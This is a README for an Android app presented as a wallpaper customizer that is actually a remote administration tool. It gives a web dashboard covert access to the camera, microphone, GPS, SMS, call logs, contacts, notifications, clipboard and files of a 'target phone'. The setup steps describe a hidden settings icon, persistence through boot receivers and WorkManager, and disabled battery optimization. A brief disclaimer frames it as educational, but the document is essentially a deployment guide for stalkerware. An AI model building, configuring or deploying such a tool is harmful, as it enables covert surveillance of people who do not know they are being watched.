# 📱 Advanced Android WebRTC Security & Remote Administration Tool (RAT)


<div align="center">
  <h3>🎨 Wallpaper Personalization + 📡 Glassmorphic Remote Surveillance Control Room</h3>
  <p><em>A dual-purpose Android application combining seamless aesthetic customization with advanced WebRTC-based real-time telemetry, remote administration, and media streaming.</em></p>
</div>

---

## ⚖️ Legal & Ethical Disclaimer

> [!CAUTION]
> **This tool is developed for educational, system diagnostic, security research, and authorized monitoring purposes only.**
> Streaming camera feeds, microphone audio, reading SMS/call logs, monitoring notifications, tracking GPS coordinates, or executing remote operations without the explicit knowledge and consent of the device owner is illegal. The user is entirely responsible for compliance with all local, federal, and international privacy laws. The author assumes no liability for misuse of this project.

---

## 🌟 Architectural Overview

This system utilizes a hybrid peer-to-peer and client-server architecture:
1. **Android Client (Java/Kotlin Interoperability)**: Runs a persistent, foreground-priority streaming service that hooks into device hardware (Camera2 API, AudioRecord, LocationManager, SensorManager, ClipboardManager, PackageManager).
2. **Node.js Signaling Server**: Facilitates low-latency signaling exchanges (SDP/ICE candidates) using Socket.IO, manages administrative uploads, and routes remote commands.
3. **Glassmorphic Web Dashboard**: A premium, real-time control room built with fluid glassmorphism, responsive controls, canvas-based sensor charts, and live media pipelines.

```
       ┌────────────────┐
       │   Web Browser  │◄─── Audio/Video Streams (P2P via WebRTC) ───┐
       │ (Control Panel)│                                              │
       └───────┬────────┘                                              │
               │                                                       │
         Socket.IO Signaling                                           │
               │                                                       │
               ▼                                                       │
       ┌────────────────┐                                      ┌───────┴────────┐
       │ Signaling &    │                                      │  Android App   │
       │ Admin Server   │◄──── Commands, Telemetry, Uploads ───┤(Streaming Serv)│
       └────────────────┘                                      └────────────────┘
```

---

## ✨ Features Breakdown

### 🎥 1. Advanced Live Camera Streaming & Snapshot Capture
* **Dual-Camera Feeds**: Streams front and back cameras concurrently (on devices with concurrent camera access support running Android 9+).
* **Hot-Swappable Resolutions**: Change camera resolution on-the-fly (e.g., Low, Medium, High) from the dashboard to optimize bandwidth.
* **Single-Frame Snapshots**: Instantly capture and download high-resolution snapshots from any camera without interrupting the WebRTC stream.

### 🎤 2. Two-Way Intercom (Walkie-Talkie Mode)
* **Bidirectional Talkback**: Send audio from the web dashboard browser microphone directly to the device speaker while receiving the device's room audio.
* **Audio Routing**: Utilizes WebRTC transceivers configured in `SEND_RECV` mode and routes through the Android `AudioManager` using `MODE_IN_COMMUNICATION`.

### 🎛️ 3. Hardware & Environmental Controls
* **Volume Control**: Change Ring, Media, Alarm, and Notification volumes remotely using sliders.
* **System Brightness**: Dynamically alter screen brightness level.
* **Flashlight Switch**: Remotely toggle the device's LED flashlight.

### 📈 4. Real-Time Ambient Sensor Monitoring
* **Illuminance Sensor**: Stream ambient light level (Lux) dynamically.
* **Accelerometer Vectors**: Fetch raw X, Y, Z vector readings.
* **Live Canvas Charts**: Visualizes incoming sensor values using HTML5 Canvas graphs on the dashboard.

### 🗣️ 5. Text-To-Speech (TTS) Broadcast
* Synthesizes and plays loud spoken messages on the device.
* Ideal for remote warnings, broadcast announcements, or accessibility.

### 📂 6. Remote File System Explorer & Drag-and-Drop Uploader
* **Directory Navigator**: Browse directories, view file metadata, and download files.
* **Chunked Large File Downloads**: Employs reliable 64KB chunking to download large files securely.
* **Drag-and-Drop Uploader**: Drag files into the dashboard to write them directly onto the device storage using base64-chunked data packets.

### 📋 7. Remote Clipboard Synchronizer
* **Get Clipboard**: Retrieve current text copied on the device.
* **Set Clipboard**: Remotely write new text to the device clipboard.
* *Note: Subject to background clipboard restrictions on Android 10+, handled gracefully via UI thread execution.*

### 🚀 8. App Launch Manager
* List all installed user and system applications with package names.
* Search through apps instantly and launch them remotely with a single click.

### 🔋 9. Diagnostics & Telemetry Dashboard
* **Power Diagnostics**: Real-time battery percentage, temperature, health, and charging status (AC/USB/Wireless).
* **Network Speed & Quality**: Read current WiFi RSSI (signal strength), Link Speed, and SSID.
* **Storage Monitor**: Shows total, used, and free space in system and external storage.
* **Location Tracking**: Plots live GPS/Network coordinates onto an interactive map.
* **Personal Data Feeds**: Access real-time SMS messages, Call Logs, Contacts, and incoming push notifications.

---

## 📦 Project Structure

```
📦 Android_WebRTC/
├── 📱 app/
│   ├── 📝 src/main/java/com/example/wallpaperapplication/
│   │   ├── 🚀 BootReceiver.java              # Boot-up service auto-restarter
│   │   ├── ✅ ConsentActivity.java           # Permission & terms manager
│   │   ├── ⚙️ Constants.java                 # Socket events & signaling configuration
│   │   ├── 🏠 MainActivity.java              # Main wallpaper customization interface
│   │   ├── 🔗 SdpObserverAdapter.java        # WebRTC signaling observer helper
│   │   ├── 📡 StreamingService.java          # Core service handling sensors, media & sockets
│   │   ├── ⚙️ StreamingSettingsActivity.java # Settings panel for configuring servers & permissions
│   │   ├── 🎨 WallpaperAdapter.java          # Wallpaper gallery grid recycler view
│   │   ├── 🛠️ CameraManager.kt               # Kotlin manager for Camera2 and snapshots
│   │   ├── 📂 FileSystemExtension.kt         # Kotlin helper for writing upload file chunks
│   │   └── 🔄 DataSyncWorker.java            # Periodic background Sync fallback
│   ├── 📋 src/main/AndroidManifest.xml       # Permissions, services, receivers, and metadata
│   └── 🔧 build.gradle.kts                   # Gradle build definitions and dependencies
├── 🖥️ Android-WebRTC-Server/
│   ├── ⚡ server.js                          # Express & Socket.IO telemetry and signaling server
│   ├── 📦 package.json                       # Node dependencies and execution scripts
│   └── 🌐 public/
│       ├── 🎨 index.html                     # Premium Glassmorphic Web Dashboard UI
│       └── 🔧 client.js                      # WebRTC connection, canvas charts & dashboard handlers
└── 📖 README.md                              # Systems documentation
```

---

## 🚀 Setup & Installation Instructions

This section outlines how to set up the Firebase integration, compile the APK, run the signaling server, and pair the device.

### 1️⃣ Firebase Integration (CRITICAL)

The application relies on Google Firebase services for authentication, notification triggers, and telemetry synchronization. 

> [!IMPORTANT]
> **Do NOT commit your `google-services.json` to any public repository!** 
> If committed, anyone can steal your API keys, run up database bills, or compromise your connected devices. A safety rule has been added to [app/.gitignore](file:///d:/AndroidStudioProjects/WallpaperApplication/app/.gitignore) to prevent accidental pushes.

#### How to set up Firebase for your project:
1. Go to the [Firebase Console](https://console.firebase.google.com/).
2. Click **Add Project** and follow the prompts to create a new project.
3. In your project overview, click the **Android icon** to add an Android app.
4. Enter the Package Name: `com.example.wallpaperapplication`.
5. Enter your debug SHA-1 signing certificate fingerprint (optional but recommended for security).
   * *To get your debug SHA-1, open a terminal in the project directory and run `./gradlew signingReport`.*
6. Register the app, then click **Download google-services.json**.
7. Copy the downloaded `google-services.json` file and place it inside the **`app/`** directory of this project:
   * Path: `Android_WebRTC/app/google-services.json`
8. In the Firebase Console, go to **Build → Realtime Database** or **Firestore** (depending on your logging needs) and enable it.
9. Under **Project Settings → API Keys**, make sure to add constraints to restrict your credentials to only run requests from your application package.

---

### 2️⃣ Configure and Launch the Signaling Server

The Node.js server serves as the communication bridge between the browser dashboard and the Android client.

#### Navigate to Server:
```bash
cd Android-WebRTC-Server
```

#### Install Dependencies:
Make sure you have Node.js 16+ installed. Install the server requirements:
```bash
npm install
```

#### Configure Server WebRTC Settings (Optional):
Open `public/client.js` and verify/update your Ice/TURN settings. By default, standard Google STUN servers are configured:
```javascript
const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' }
    // Add your TURN servers here if accessing the server outside your local network:
    // { urls: 'turn:YOUR_TURN_SERVER', username: 'username', credential: 'password' }
  ]
};
```

#### Start the Server:
```bash
# Run server
node server.js
```
The server will boot and display:
```
✅ Signaling Server started on port 3000
```
To access the Web Dashboard, navigate to `http://<YOUR_SERVER_IP_ADDRESS>:3000` (e.g. `http://localhost:3000` if local).

---

### 3️⃣ Configure and Compile the Android APK

#### Configure the Signaling Endpoint
1. Open the project in **Android Studio**.
2. Open [Constants.java](file:///d:/AndroidStudioProjects/WallpaperApplication/app/src/main/java/com/example/wallpaperapplication/Constants.java).
3. Update `DEFAULT_SOCKET_URL` to point to your Signaling Server's IP address:
   ```java
   public static final String DEFAULT_SOCKET_URL = "http://192.168.1.100:3000"; // Replace with your local/public server IP
   ```

#### Build the APK
* **Via Android Studio UI**: Click **Build → Build Bundle(s) / APK(s) → Build APK(s)**.
* **Via Terminal**: Run the Gradle wrapper script in the root project folder:
  ```powershell
  # Windows Powershell
  .\gradlew assembleDebug
  
  # Linux/macOS
  ./gradlew assembleDebug
  ```
The generated APK will be available at:
`app/build/outputs/apk/debug/app-debug.apk`

---

## 📱 Device Setup & Permissions

To ensure all background features, sensors, media streams, and file syncs work properly without getting killed by Android's aggressive energy-saver mechanisms, perform the following steps on the target phone:

1. **Install the APK** on the target device.
2. Open the application. Tap the **invisible Settings icon** in the top-right corner of the main screen to enter the **Streaming Settings** menu.
3. Turn the **Streaming Toggle ON**. The app will request permissions:
   * **Camera**: For live streams and snapshot capture.
   * **Microphone**: For audio streaming and two-way talkback.
   * **Location**: For real-time GPS tracking.
   * **Contacts, SMS, Call Logs**: For fetching phone lists and monitoring SMS.
   * **Storage / All Files Access**: Required on Android 11+ to browse and download/upload files from the File Explorer.
4. **Disable Battery Optimization**:
   * Go to **Settings → Apps → Wallpaper Application → Battery**.
   * Change optimization level to **Unrestricted** (prevents Android from killing the background service).
5. **Enable Notification Listener Access**:
   * Go to **Settings → Security & Privacy → Special App Access → Notification Listener Access**.
   * Turn access **ON** for the app to allow the dashboard to capture incoming notifications.

---

## ⚙️ Persistent Background Strategy

To keep the telemetry streaming service active even when the application is swiped away from memory or if the system undergoes a reboot:
* **Foreground Service**: The app starts a high-priority foreground service with a persistent system tray notification.
* **Boot Restart Receiver**: The `BootReceiver` captures the `ACTION_BOOT_COMPLETED` broadcast, launching the service immediately upon system start.
* **WorkManager Fallback**: A periodic sync worker (`DataSyncWorker`) runs every 15 minutes as a fallback constraint. If the system forcefully shuts down the main process, WorkManager will restart the service components in the background.

---

## 🐛 Debugging & Troubleshooting

### Android Client Logs
Monitor the connection lifecycle and errors using ADB:
```bash
# Monitor only streaming service and WebRTC logs
adb logcat -s StreamingService:V CameraManager:V WebRTC:V
```

* **No Video Stream**: Check if the camera is already in use by another app, and verify that "Camera Access" is enabled globally in the quick settings panel of Android 12+ devices.
* **Talkback Audio Not Heard**: Ensure that the browser's microphone permissions are granted and that the device speaker is not muted.
* **Background Disconnections**: Verify you have exempted the application from Battery Optimization.

---

## 📜 License

This project is licensed under the MIT License. Feel free to modify and build upon this project for educational and research purposes.